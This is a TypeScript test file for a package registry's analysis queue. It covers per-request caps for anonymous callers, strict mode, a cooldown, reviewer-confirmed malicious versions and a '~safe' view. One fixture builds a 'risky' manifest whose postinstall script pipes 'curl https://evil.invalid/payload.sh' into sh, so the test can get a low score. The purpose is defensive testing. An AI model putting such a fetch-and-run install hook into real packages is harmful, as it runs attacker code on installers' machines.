// What one resolve may queue for analysis. The analysis consumer runs one job at a time (about 600 an hour at its
// production peak), so an anonymous resolve of a cold tree queues the root and at most ANONYMOUS_QUEUED_DEPENDENCIES of
// its dependencies, nearest first; a signed-in caller (a token, or a website session) still queues every unscored
// version. Only what is queued changes: the answer, its warnings and its pending list are the same for both.
// npm is a local stand-in; the database is a real Postgres; the analysis service records what it was asked to queue.
import { afterAll, beforeEach, describe, expect, test } from "bun:test";
import { createHash } from "node:crypto";
import { Effect, Layer, Option } from "effect";
import { analyze, type Analysis as Scored } from "@apm/core";
import type { Caller } from "../src/server.ts";
import { freshDatabase } from "../../../tests/acceptance/postgres.ts";
import { Client } from "pg";
import { Analysis, type JobOutcome } from "../src/analysis.ts";
import { REVIEW_DEFAULTS, ReviewConfig } from "../src/review.ts";
import { Auth } from "../src/auth.ts";
import { ANONYMOUS_QUEUED_DEPENDENCIES, apmRoute, upstreamRoute } from "../src/apm.ts";
import { Blobs } from "../src/blobs.ts";
import { Clock } from "../src/clock.ts";
import { RegistryConfig } from "../src/config.ts";
import { Store } from "../src/db.ts";
import { Upstream } from "../src/upstream.ts";
import { MemoryPool, RequestMemory } from "../src/memory.ts";

const POOL = new MemoryPool();
const NOW = Date.parse("2026-11-12T00:00:00Z");
const DAY = 86_400_000;

/** The root's dependencies, in its manifest's order: more than an anonymous resolve may queue. */
const DEPS = Array.from({ length: 12 }, (_, i) => `cold-dep${String(i).padStart(2, "0")}`);
const ROOT = "cold-root";

/** One version document as the stand-in serves it. */
type Version = { name: string; version: string; main: string; license: string; dist: { tarball: string; shasum: string; integrity: string }; dependencies?: Record<string, string> };

/**
 * Roots with a newer 2.0.0 beside the unscored 1.0.0, each under a name of its own (the upstream layer keeps a
 * packument it read for the rest of the file, the clock being fixed): SCORED_ROOT's 2.0.0 is scored too low for strict
 * mode (scoreNewerRoot), COOLING_ROOT's was published an hour ago, inside the cooldown.
 */
const SCORED_ROOT = "cold-root-scored";
const COOLING_ROOT = "cold-root-cooling";

/** Its 2.0.0 has no score and an apm reviewer confirmed it malicious (confirmNewerRoot). */
const CONFIRMED_ROOT = "cold-root-confirmed";

/** 1.0.0 to 6.0.0: every version from 2.0.0 up has no score and was confirmed malicious. */
const FIVE_CONFIRMED_ROOT = "cold-root-five-confirmed";

/** 1.0.0 to 7.0.0, all past the cooldown: every version from 2.0.0 up is scored, 1.0.0 is not (the ~safe view). */
const SAFE_ROOT = "cold-root-safe";
const ROOTS = [ROOT, SCORED_ROOT, COOLING_ROOT, CONFIRMED_ROOT, FIVE_CONFIRMED_ROOT, SAFE_ROOT];

/** The versions npm lists for a root, oldest first; the last is latest. */
function versionsOf(name: string): string[] {
  const upTo = (n: number): string[] => Array.from({ length: n }, (_, i) => `${i + 1}.0.0`);

  if (name === FIVE_CONFIRMED_ROOT) return upTo(6);

  if (name === SAFE_ROOT) return upTo(7);

  return name === SCORED_ROOT || name === COOLING_ROOT || name === CONFIRMED_ROOT ? upTo(2) : upTo(1);
}

/** Whether the analysis service stores a score the moment it is asked (set by a test; beforeEach clears it). */
const scenario = { landScores: false };

const integrityOf = (name: string): string => `sha512-${createHash("sha512").update(name).digest("base64")}`;
const digestOf = (name: string): string => `sha512-${createHash("sha512").update(name).digest("hex")}`;

/** A stored analysis for name@version: clean, or with an install script that scores it under strict mode's floor. */
function analysisOf(input: { name: string; version: string; risky: boolean }): Scored {
  const manifest = input.risky ? { name: input.name, version: input.version, main: "index.js", license: "MIT", scripts: { postinstall: "curl https://evil.invalid/payload.sh | sh" } } : { name: input.name, version: input.version, main: "index.js", license: "MIT" };
  const text = JSON.stringify(manifest);
  const file = (path: string, value: string) => ({ path, size: value.length, mode: 0o644, data: new TextEncoder().encode(value) });

  return analyze({ name: input.name, manifest, files: [file("package.json", text), file("index.js", "module.exports = 1;")], publisher: "u", previousPublishers: [] });
}

/** npm with the root and its dependencies, all published ten days ago and none analysed. */
function fakeNpm() {
  const server = Bun.serve({
    port: 0,
    hostname: "127.0.0.1",
    fetch(req): Response {
      const name = decodeURIComponent(new URL(req.url).pathname.slice(1));

      if (!ROOTS.includes(name) && !DEPS.includes(name)) return Response.json({ error: "Not found" }, { status: 404 });
      const dist = { tarball: `https://npm.invalid/${name}/-/${name}-1.0.0.tgz`, shasum: "1".repeat(40), integrity: integrityOf(name) };
      const version: Version = { name, version: "1.0.0", main: "index.js", license: "MIT", dist };
      const old = new Date(NOW - 10 * DAY).toISOString();

      // only the root has dependencies: a leaf's manifest has no such field, as npm writes it
      if (ROOTS.includes(name)) version.dependencies = Object.fromEntries(DEPS.map((d) => [d, "^1.0.0"]));

      const listed = ROOTS.includes(name) ? versionsOf(name) : ["1.0.0"];
      const newer = new Date(name === COOLING_ROOT ? NOW - 3_600_000 : NOW - 10 * DAY).toISOString();
      const versions = Object.fromEntries(listed.map((v) => [v, { ...version, version: v }]));
      const time = Object.fromEntries(listed.map((v) => [v, v === "1.0.0" ? old : newer]));

      return Response.json({ name, "dist-tags": { latest: listed.at(-1) ?? "1.0.0" }, versions, time });
    },
  });

  return { url: server.url.href, stop: () => server.stop(true) };
}

/**
 * An analysis service that queues nothing and records each version it was asked to queue. With `scenario.landScores`
 * a version's clean score is stored the moment it is asked for, as if the queue had run it at once: the resolve's
 * second pass, after its wait, then finds it scored.
 */
function recordingAnalysis(asked: Set<string>) {
  const note = (name: string, version: string): void => {
    asked.add(`${name}@${version}`);
  };

  return Layer.effect(
    Analysis,
    Effect.gen(function* () {
      const store = yield* Store;

      return Analysis.of({
        ensure: (pkg, v) =>
          Effect.gen(function* () {
            note(pkg.name, v.version);

            if (scenario.landScores) yield* store.setUpstreamAnalysis({ name: pkg.name, version: v.version, digest: digestOf(pkg.name), analysis: analysisOf({ name: pkg.name, version: v.version, risky: false }), at: NOW });

            return v;
          }),
        enqueue: (name, version) => Effect.sync(() => (note(name, version), true)),
        runJob: () => Effect.succeed<JobOutcome>("missing"),
        recover: Effect.succeed(0),
      });
    }),
  );
}

const noBlobs = Layer.succeed(
  Blobs,
  Blobs.of({ put: () => Effect.void, stream: () => Effect.succeed(Option.none()), bytes: () => Effect.succeed(Option.none()), exists: () => Effect.succeed(false), remove: () => Effect.void }),
);

type Asked = { status: number; body: unknown; queued: ReadonlySet<string> };

let db: { url: string; drop: () => Promise<void> } | null = null;
const npm = fakeNpm();

/** A fresh database and the default scenario for every test; `fresh` sets another one. */
beforeEach(async () => {
  await db?.drop();
  db = await freshDatabase();
  scenario.landScores = false;
});

afterAll(async () => {
  npm.stop();
  await db?.drop();
});

/** The database this test runs on. */
function database(): { url: string } {
  if (db === null) throw new Error("no database: beforeEach makes one");

  return db;
}

/** Stores the risky score of SCORED_ROOT's 2.0.0 (under strict mode's floor of 40). */
async function scoreNewerRoot(): Promise<void> {
  const store = Store.postgres(database().url);
  const write = Effect.flatMap(Store, (s) => s.setUpstreamAnalysis({ name: SCORED_ROOT, version: "2.0.0", digest: digestOf(SCORED_ROOT), analysis: analysisOf({ name: SCORED_ROOT, version: "2.0.0", risky: true }), at: NOW }));

  await Effect.runPromise(write.pipe(Effect.provide(store), Effect.scoped));
}

/** An apm reviewer's confirmation that CONFIRMED_ROOT's 2.0.0 is malicious, as review.ts stores one. */
const confirmNewerRoot = (): Promise<void> => confirmVersions(CONFIRMED_ROOT, ["2.0.0"]);

/** An apm reviewer's confirmation that each of `versions` of `name` is malicious. */
async function confirmVersions(name: string, versions: readonly string[]): Promise<void> {
  const c = new Client({ connectionString: database().url });

  const result = {
    outcome: "flagged",
    verdict: "malicious",
    findings: [{ file: "index.js", line: 1, quote: "q", excerpt: "e", issue: "i", severity: "high" }],
    model: "test",
    reviewedAt: new Date(NOW).toISOString(),
    summary: "malicious",
    coverage: { mode: "files", previousVersion: null, filesInScope: 1, filesRead: 1 },
    read: ["index.js"],
    notRead: [],
    attempts: [{ result: "malicious", kept: 1, dropped: 0, promptTokens: 1, completionTokens: 1, latencyMs: 1 }],
    secondOpinion: null,
  };

  await c.connect();

  try {
    for (const version of versions) {
      await c.query("INSERT INTO reviews (package, version, digest, outcome, result, reviewed_at, human_state) VALUES ($1, $2, $3, 'flagged', $4, $5, 'confirmed')", [name, version, digestOf(name), JSON.stringify(result), NOW]);
    }
  } finally {
    await c.end();
  }
}

/** GET /-/apm/v1/resolve for the root as `caller`, with no wait for the queue; what it answered and what it queued. */
async function resolveAs(caller: Caller, opts: { strict?: boolean; range?: string; root?: string; review?: boolean } = {}): Promise<Asked> {
  const queued = new Set<string>();
  const { url } = database();
  const settings = { baseUrl: "http://registry.test/", webUrl: "http://web.test/", upstreamUrl: npm.url, legacyAuth: false, namePolicy: "open", admins: [] } as const;
  const store = Store.postgres(url);
  const base = Layer.mergeAll(store, Clock.fixed({ now: NOW, wallNow: NOW }), recordingAnalysis(queued).pipe(Layer.provide(store)), noBlobs, Layer.succeed(RegistryConfig, settings), RequestMemory.layer(POOL));
  const auth = Auth.layer({ databaseUrl: url, options: { secret: "test-secret-that-is-long-enough-for-better-auth" }, baseURL: "http://web.test/" });
  // the AI review on, so a reviewer's confirmation is read (confirmNewerRoot)
  const review = opts.review ? Layer.succeed(ReviewConfig, { ...REVIEW_DEFAULTS, serviceTokenHash: "0".repeat(64), admins: [] }) : Layer.empty;
  const layers = Layer.provideMerge(Layer.mergeAll(Upstream.layer(npm.url, 60_000, null), auth, review), base);
  const params = new URLSearchParams({ name: opts.root ?? ROOT, range: opts.range ?? "latest", wait: "0" });

  if (opts.strict) params.set("strict", "1");
  const req = new Request(`http://registry.test/-/apm/v1/resolve?${params}`);
  const program = Effect.flatMap(apmRoute(req, new URL(req.url), caller), (res) => Effect.promise(async () => ({ status: res?.status ?? 0, body: res ? await res.json() : null })));
  const out = await Effect.runPromise(program.pipe(Effect.provide(layers), Effect.scoped));

  return { ...out, queued };
}

/** GET ~safe/<name>, npm's packument through the safe view; what it answered and what it queued. */
async function safeView(name: string): Promise<{ status: number; queued: ReadonlySet<string> }> {
  const queued = new Set<string>();
  const { url } = database();
  const settings = { baseUrl: "http://registry.test/", webUrl: "http://web.test/", upstreamUrl: npm.url, legacyAuth: false, namePolicy: "open", admins: [] } as const;
  const store = Store.postgres(url);
  const base = Layer.mergeAll(store, Clock.fixed({ now: NOW, wallNow: NOW }), recordingAnalysis(queued).pipe(Layer.provide(store)), noBlobs, Layer.succeed(RegistryConfig, settings), RequestMemory.layer(POOL));
  const layers = Layer.provideMerge(Upstream.layer(npm.url, 60_000, null), base);
  const req = new Request(`http://registry.test/~safe/${name}`);
  const program = Effect.flatMap(upstreamRoute(req, new URL(`http://registry.test/${name}`), true), (res) => Effect.promise(async () => (await res?.body?.cancel(), res?.status ?? 0)));

  return { status: await Effect.runPromise(program.pipe(Effect.provide(layers), Effect.scoped)), queued };
}

/** Stores a clean score for each of `versions` of `name`. */
async function scoreVersions(name: string, versions: readonly string[]): Promise<void> {
  const store = Store.postgres(database().url);
  const write = Effect.flatMap(Store, (st) => Effect.forEach(versions, (version) => st.setUpstreamAnalysis({ name, version, digest: digestOf(name), analysis: analysisOf({ name, version, risky: false }), at: NOW })));

  await Effect.runPromise(write.pipe(Effect.provide(store), Effect.scoped));
}

const ANON: Caller = { kind: "anon" };
const TOKEN: Caller = { kind: "user", user: "someone", tokenHash: "0".repeat(64), scope: "publish" };

describe("what one resolve queues for analysis", () => {
  test("an anonymous resolve queues the root and its nearest dependencies only", async () => {
    const anon = await resolveAs(ANON);

    expect(ANONYMOUS_QUEUED_DEPENDENCIES).toBe(8);
    expect([...anon.queued].sort()).toEqual([`${ROOT}@1.0.0`, ...DEPS.slice(0, ANONYMOUS_QUEUED_DEPENDENCIES).map((d) => `${d}@1.0.0`)].sort());
  });

  test("a token caller queues every unscored version, as before", async () => {
    const signedIn = await resolveAs(TOKEN);

    expect([...signedIn.queued].sort()).toEqual([`${ROOT}@1.0.0`, ...DEPS.map((d) => `${d}@1.0.0`)].sort());
  });

  test("the answer is the same either way: every dependency is still pending, nothing is passed", async () => {
    for (const strict of [false, true]) {
      const anon = await resolveAs(ANON, { strict });
      const signedIn = await resolveAs(TOKEN, { strict });

      expect(anon.status).toBe(signedIn.status);
      expect(anon.body).toEqual(signedIn.body);
    }

    // the default mode installs with a warning for each version not scored yet, the ones it did not queue included
    const anon = await resolveAs(ANON);
    const text = JSON.stringify(anon.body);

    for (const d of DEPS) expect(text).toContain(d);
    expect(anon.status).toBe(200);
    // strict waits for them: pending, never passed
    expect((await resolveAs(ANON, { strict: true })).status).toBe(202);
  });

  // review of eecb224, finding 2: the allowance was a walk's, so the pass after the wait got eight more slots
  test("a capped resolve spends its slots once per request, the pass after its wait included", async () => {
    scenario.landScores = true;
    const anon = await resolveAs(ANON);

    expect([...anon.queued].sort()).toEqual([`${ROOT}@1.0.0`, ...DEPS.slice(0, ANONYMOUS_QUEUED_DEPENDENCIES).map((d) => `${d}@1.0.0`)].sort());

    // the next ask finds those scored, which do not count, and queues the rest
    const next = await resolveAs(ANON);

    expect([...next.queued].sort()).toEqual(DEPS.slice(ANONYMOUS_QUEUED_DEPENDENCIES).map((d) => `${d}@1.0.0`));
  });

  // review of eecb224, finding 1: the root slot went to a candidate already scored, so the older one waited forever
  test("strict: an older root under a newer one scored too low is queued, not left pending", async () => {
    await scoreNewerRoot();
    const anon = await resolveAs(ANON, { strict: true, range: "*", root: SCORED_ROOT });

    expect(anon.status).toBe(202);
    expect(anon.queued.has(`${SCORED_ROOT}@1.0.0`)).toBe(true);
    expect(anon.queued.has(`${SCORED_ROOT}@2.0.0`)).toBe(false);
  });

  test("strict: the root slot skips a newer version inside the cooldown and goes to the older one", async () => {
    const anon = await resolveAs(ANON, { strict: true, range: "*", root: COOLING_ROOT });

    expect(anon.status).toBe(202);
    expect(anon.queued.has(`${COOLING_ROOT}@1.0.0`)).toBe(true);
    expect(anon.queued.has(`${COOLING_ROOT}@2.0.0`)).toBe(false);
    // the same answer a token caller gets
    const signedIn = await resolveAs(TOKEN, { strict: true, range: "*", root: COOLING_ROOT });

    expect(signedIn.status).toBe(anon.status);
    expect(signedIn.body).toEqual(anon.body);
  });

  // review of 56229cf, finding 1: strict mode read an unscored, confirmed 2.0.0 as "not scored yet" and waited on it
  test("strict: a newer version confirmed malicious is skipped, never waited for, and the older root is queued", async () => {
    await confirmNewerRoot();

    for (const caller of [ANON, TOKEN]) {
      const out = await resolveAs(caller, { strict: true, range: "*", root: CONFIRMED_ROOT, review: true });

      expect(out.status).toBe(202);
      expect(JSON.stringify(out.body)).toContain(`${CONFIRMED_ROOT}@1.0.0 is still being analysed`);
      expect(JSON.stringify(out.body)).toContain("confirmed malicious by an apm reviewer");
      expect(out.queued.has(`${CONFIRMED_ROOT}@1.0.0`)).toBe(true);
      expect(out.queued.has(`${CONFIRMED_ROOT}@2.0.0`)).toBe(false);
    }
  });

  // review of 0126b2b, finding 1: every candidate spent a signed-in slot, analysed or not, so five confirmed newer
  // versions used all five and the older root was never queued
  test("strict: five newer versions confirmed malicious spend no slot; the older root is queued, signed in or not", async () => {
    const newer = ["2.0.0", "3.0.0", "4.0.0", "5.0.0", "6.0.0"];

    await confirmVersions(FIVE_CONFIRMED_ROOT, newer);

    for (const caller of [TOKEN, ANON]) {
      const out = await resolveAs(caller, { strict: true, range: "*", root: FIVE_CONFIRMED_ROOT, review: true });

      expect(out.status).toBe(202);
      expect(JSON.stringify(out.body)).toContain(`${FIVE_CONFIRMED_ROOT}@1.0.0 is still being analysed`);
      expect(out.queued.has(`${FIVE_CONFIRMED_ROOT}@1.0.0`)).toBe(true);

      for (const v of newer) expect(out.queued.has(`${FIVE_CONFIRMED_ROOT}@${v}`)).toBe(false);
    }
  });

  // the same mistake in the ~safe view: its five slots went to the newest cooled versions, scored or not
  test("~safe: scored newer versions spend none of the view's five; the older unscored one is queued", async () => {
    await scoreVersions(SAFE_ROOT, ["2.0.0", "3.0.0", "4.0.0", "5.0.0", "6.0.0", "7.0.0"]);
    const out = await safeView(SAFE_ROOT);

    expect(out.status).toBe(200);
    expect([...out.queued]).toEqual([`${SAFE_ROOT}@1.0.0`]);
  });
});
